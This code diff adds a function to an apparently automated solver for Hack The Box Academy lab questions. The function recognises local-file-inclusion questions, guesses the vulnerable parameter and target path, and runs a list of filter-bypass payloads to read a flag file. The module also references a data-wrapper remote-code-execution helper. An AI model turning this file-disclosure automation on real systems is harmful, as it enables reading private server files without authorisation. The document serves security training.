@@ -253,8 +253,108 @@ def try_data_wrapper_rce(
     return body[:max_output], attempt
 
 
+# ---- question-pattern probe -------------------------------------------------
+
+
+_LFI_PROMPT_RE = re.compile(
+    r"(?:bypass|defeat|evade).+?filter|"
+    r"local\s+file\s+inclu|"
+    r"\bLFI\b|"
+    r"read\s+(?:the\s+)?/?flag(?:\.txt)?|"
+    r"read\s+(?:the\s+)?file\s+at\s+/",
+    re.IGNORECASE | re.DOTALL,
+)
+_LFI_FLAG_TARGET_RE = re.compile(r"/\w[\w./\-]*")
+_LFI_PARAM_HINT_RE = re.compile(
+    r"\?(?P<param>language|file|page|view|path|include|doc|read|src)\s*=",
+    re.IGNORECASE,
+)
+
+
+def probe_via_lfi(
+    runner: "HttpTargetRunner",
+    question_prompt: str,
+    *,
+    hints: list[str] | None = None,
+    section_code_blocks: list[str] | None = None,
+) -> tuple[str, str, float] | None:
+    """Detect LFI-shaped questions and run the bypass payload list.
+
+    Returns ``(answer, rationale, confidence)`` when a payload yielded
+    an HTB flag, None otherwise. Confidence is 0.90 -- we trust an
+    actual file-disclosure more than heuristic answers but below the
+    HTTP probe's 0.95 (which has tighter pattern matching).
+
+    The function:
+      1. Recognises LFI-shaped prompts (filter bypass, "read /flag",
+         keyword "LFI"/"local file inclusion") to avoid spraying
+         payloads on unrelated questions.
+      2. Detects the LFI parameter from the section code blocks
+         (e.g. ``index.php?language=`` -> ``param="language"``).
+         Falls back to ``language`` (mod 23's default sink name).
+      3. Picks the target path from the prompt (``read /flag.txt`` ->
+         target_path=/flag.txt). Falls back to /flag.txt.
+      4. Hands off to :func:`try_lfi_read` which walks the bypass
+         payloads in priority order.
+    """
+    hints_text = " ".join(h for h in (hints or []) if h)
+    enriched = (question_prompt or "") + (" " + hints_text if hints_text else "")
+
+    if not _LFI_PROMPT_RE.search(enriched):
+        return None
+
+    # 1. Pick the LFI param. Prefer one named in code blocks; else
+    #    default to "language" (the academy's mod 23 sink).
+    param = "language"
+    blocks = " ".join(section_code_blocks or [])
+    m_param = _LFI_PARAM_HINT_RE.search(blocks)
+    if m_param:
+        param = m_param.group("param").lower()
+
+    # 2. Pick the target path. Prefer an explicit ``/something`` in the
+    #    prompt; else default to /flag.txt.
+    target_path = "/flag.txt"
+    for m in _LFI_FLAG_TARGET_RE.finditer(enriched):
+        candidate = m.group(0)
+        # Skip URLs/IP-style candidates that don't look like file paths.
+        if "." in candidate.split("/")[-1] or candidate.endswith("/"):
+            target_path = candidate
+            break
+
+    # 3. Detect the approved-prefix when the section's example URLs use
+    #    ``language=languages/en.php`` -- the prefix here is "languages".
+    approved_prefix: str | None = None
+    m_prefix = re.search(
+        rf"\?{re.escape(param)}=([\w]{{1,30}})/[\w./]+",
+        blocks, re.IGNORECASE,
+    )
+    if m_prefix:
+        approved_prefix = m_prefix.group(1)
+
+    # Generous cap: with approved_prefix the payload list grows past
+    # the default 12-payload budget, and we'd rather try them all
+    # than silently miss the working bypass.
+    answer, attempts = try_lfi_read(
+        runner,
+        param=param,
+        target_path=target_path,
+        approved_prefix=approved_prefix,
+        max_attempts=20,
+    )
+    if not answer:
+        return None
+    technique = attempts[-1].technique if attempts else "lfi"
+    rationale = (
+        f"LFI bypass {technique!r} param={param!r} target={target_path!r}"
+        + (f" prefix={approved_prefix!r}" if approved_prefix else "")
+        + f" -> {answer!r}"
+    )
+    return (answer, rationale, 0.90)
+
+
 __all__ = [
     "LfiAttempt",
     "try_lfi_read",
     "try_data_wrapper_rce",
+    "probe_via_lfi",
 ]
